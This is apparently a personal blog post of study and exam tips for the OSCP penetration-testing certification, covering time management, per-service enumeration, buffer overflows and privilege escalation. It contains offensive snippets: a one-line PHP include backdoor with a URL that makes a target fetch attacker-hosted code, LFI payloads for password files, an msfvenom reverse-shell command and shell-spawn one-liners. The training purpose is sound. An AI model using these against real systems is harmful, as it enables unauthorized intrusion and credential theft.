---
title: "How to pass the OSCP"
image: /images/offsec.jpg
excerpt: "A short set of tips for students attempting the Offensive Security Certified Professional (OSCP) certification exam."
---

*This is a short set of tips for students attempting the Offensive Security Certified Professional (OSCP) certification exam. Originally this was forked from a GitHub Gist by [unfo](https://github.com/unfo) and then modified. The original can still be found [here](https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3).*

*Note that these tips were written in late 2016 and are somewhat dated now. I'd strongly recommend reading Alex Dib's ["Passing OSCP"](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html) blog post as well.*

<hr/>
<br/>

### Time yourself

Set a timer for 1hr, repeating. Each time it goes off, stop and evaluate your progress. If you haven't made any progress for 2 hours, move on to the next machine.

**This is important**. Getting stuck due to tunnel vision is extremely common during the exam. This isn't the labs - you don't have time to waste diving down rabbit holes.

### Take breaks

Recognise when you're stuck, and go for a walk. Sometimes all it takes is some fresh air and a clear head for you to figure out the next step.

**You have more time than you think.** It's extremely uncommon to pass the exam with less than an hour to spare. Usually students pass within 18 hours, or not at all. Take a break when you need to, and you'll be more likely to end up in that first category.

### RTFM and Record everything

Read the [exam guide](https://support.offensive-security.com/oscp-exam-guide/) very carefully. If you pop a box but don't take the required screenshots, you're SooL. If you use a prohibited tool, you're SooL. If you misuse Metasploit/Meterpreter, you're SooL.

Set your terminal scrollback to infinite, and keep terminal tabs open if you're prone to forgetting to screenshot.

### Prepare beforehand

It pays to have everything well prepared before the exam. This can include precompiling privesc exploits for common platforms, especially ones which were used in the course material or labs. 

This also includes your report template. It's worth setting this up ahead of the exam, so that when you're in a sleep-deprived haze the day after your exam attempt you can simply drop in your documentation and submit.

## Enumeration

There's a reason the "try harder" mantra exists. If you don't *enumerate thoroughly*, you'll spend the whole exam beating your head on walls.

DO NOT SKIP STEPS.

DO NOT PASS GO.

SEARCH ***ALL*** THE VERSIONS WITH `searchsploit` 
(or google -> `site:exploit-db.com APP VERSION`)

### DNS

Reverse lookup of entire provided range:

```
dig.sh <ips.txt>

for ip in $(cat ips.txt); do nslookup $ip <nameserver>; done
```

### Port Scans

Perform a full port scan of your target. I used my fork of [DarkEnumeration](https://github.com/meldridge/DarkEnumeration), but [Reconnoitre](https://github.com/codingo/Reconnoitre) is a better option these days.

1. Actually **read** the intensive nmap scan
2. Actually **read** Nikto/Dirb/nmap NSE script output
3. Run the port scan again if you think something might have been missed

Be aware of your network conditions and its impact on your scanning tools. When I did my exam attempt my round-trip time to the exam servers was over 250ms, and packet loss was a concern.

Unicornscan can be set to particular PPS (packets per second) and can be configured to test each port multiple times. This is well worth the additional time investment: you *really* don't want a single lost packet causing a false-negative which fails you the exam.


### HTTP - 80, 8080, 8000

```
curl -i ${IP}/robots.txt
```

Note down Server and other module versions.

searchsploit them ALL.

Visit all URLs from robots.txt.

```
nikto -host $IP

gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt

gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt
```

If nothing, try more web word lists.

*Browse the site* but keep an eye on the burp window / source code / cookies etc.

Things to look out for:

- Default credentials for software
- SQL-injectable GET/POST params
- LFI/RFI through ?page=foo type params
- LFI:
  - `/etc/passwd` | `/etc/shadow`
  - `/var/www/html/config.php` or similar paths to get SQL etc creds
  - `?page=php://filter/convert.base64-encode/resource=../config.php`
  - `../../../../../boot.ini` to find out windows version
- RFI:
  - Have your PHP/cgi downloader ready
  - `<?php include $_GET['inc']; ?>` simplest backdoor to keep it dynamic without anything messing your output
  - Then you can just `http://$IP/inc.php?inc=http://$YOURIP/bg.php` and have full control with minimal footprint on target machine
  - get `phpinfo()`


### HTTPS - 443

Heartbleed / CRIME / Other similar attacks

Read the actual SSL CERT to:

- find out potential correct vhost to GET
- is the clock skewed
- any names that could be usernames for bruteforce/guessing.

### FTP - 21

- Anonymous login
- Enumerate the hell out of the machine!
  - OS version
  - Other software you can find on the machine (Prog Files, yum.log, /bin)
  - password files
  - DLLs for `msfpescan` / BOF targets
- Do you have UPLOAD potential?
  - Can you trigger execution of uploads?
  - Swap binaries?
- Vulnerabilities in version / RCE

### SMB - 139, 445

```
enum4linux -a $IP
```

Read through the report and search for versions of things => `searchsploit`

```
smbclient -L $IP
```

Mount shares

```
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
```

Can you access shares?

- Directly exploitable MSxx-xxx versions?
  - Worth burning MSF strike?


### SNMP - UDP 169

- Try to enumerate windows shares / network info

Quick test of communities:

```
onesixtyone
```

Full discovery of everything you can:

```
snmp-check
```


### TFTP - UDP 69

- Read / Write access?
  - Pretty much same things as FTP

### SSH - 22

Unless you get a MOTD or a broken sshd version, you are SooL and this is likely just a secondary access point once you break something else.

### Email - 25, 110/995 or 143/993

SMTP, POP3(s) and IMAP(s) are good for enumerating users.

Also: ***CHECK VERSIONS*** and `searchsploit`


## Buffer Overflows

1. Determine length of overflow trigger w/ binary search "A"x1000
2. Determine exact EIP with `pattern_create.rb` & `pattern_offset.rb`
3. Determine badchars to make sure all of your payload is getting through _**(Do not skip this step)**_
4. Develop exploit
  - Is the payload right at ESP 
    - `JMP ESP`
  - Is the payload before ESP 
    - `sub ESP, 200` and then `JMP ESP`
    - or
    - `call [ESP-200]`
5. `msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -o filename`
  - Make sure it fits your payload length above
6. Gain shell, local priv esc or rooted already?

## Limited Shells

- python -c 'import pty; pty.spawn("/bin/sh")'
- echo os.system('/bin/bash')
- /bin/sh -i
- perl —e 'exec "/bin/sh";'

### Upgrading from limited shell to full TTY
Source: [RopNop's blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

1. In reverse shell
- $ python -c 'import pty; pty.spawn("/bin/bash")'
- Ctrl-Z
2. In Kali
- $ stty raw -echo
- $ fg
3. In reverse shell
- $ reset
- $ export SHELL=bash
- $ export TERM=xterm-256color
- $ stty rows X columns Y

Useful links: 
 - <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>
 - <http://netsec.ws/?p=337>

## Privilege Escalation

### Linux

1. **Check current access first**:
  - Am I in sudoers?
  - Do I have sudoedit access to useful files?
2. **Enumerate!**
  - Try [LinEnum](https://github.com/rebootuser/LinEnum), make sure to check it in thorough mode too
  - Check for world-writeable files, interesting setuid/setgid binaries, unusual things in crontab/cron.d or user cron (`crontab -l`)

Good resources:
- <http://netsec.ws/?p=309>
- <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
- <https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List>
- <https://www.rebootuser.com/?p=1623>
- <https://www.kernel-exploits.com/>
- <http://security.stackexchange.com/questions/101715/automatically-enumerate-missing-patches-on-penetration-test>

Can also try Dirty COW: <https://github.com/dirtycow/dirtycow.github.io/wiki>

### Windows

1. **Check current access first**: 
  - Am I already Administrator? 
  - Am I in Remote Desktop Users?
2. **Enumerate!**

Good resources:
- <http://www.fuzzysecurity.com/tutorials/16.html>
- <http://it-ovid.blogspot.com.au/2012/02/windows-privilege-escalation.html?m=1>
- <http://www.greyhathacker.net/?p=738>
- <https://www.youtube.com/watch?v=kMG8IsCohHA>
- <https://www.youtube.com/watch?v=PC_iMqiuIRQ>

## Misc tools

- `cewl` for crawling a site for bruteforcing user/password
- don't forget about `nmap` scripts!
  - e.g. `--script smtp-commands` or `--script auth-owners`